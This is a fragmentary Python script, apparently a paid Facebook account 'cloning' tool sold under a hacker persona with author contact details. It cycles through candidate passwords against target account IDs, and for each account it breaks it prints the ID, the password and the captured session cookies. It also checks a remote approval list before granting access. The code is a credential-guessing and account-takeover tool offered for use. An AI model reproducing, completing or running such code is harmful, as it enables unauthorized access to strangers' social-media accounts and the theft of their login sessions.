...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Hacker1414/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
#    username = input(' \033[0;92mEnter Username:Hacker ')
  #  password = input(' \033[0;93mEnter Password:Live ')

 #   if username == 'Hacker' and password == 'Live':
...
os.system('xdg-open https://www.facebook.com/Tajul.Islam.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-Tajul Islam Rabbi ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Hacker Live ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mHacker1414]   ║\33[1;34m   
╠══[Whatsapp                 • 01814032575 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
...
def login():
	...
	if TUTUL in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801814032575')
	elif TUTUL in ['0']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Hacker-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Hacker,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/Hacker1414/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
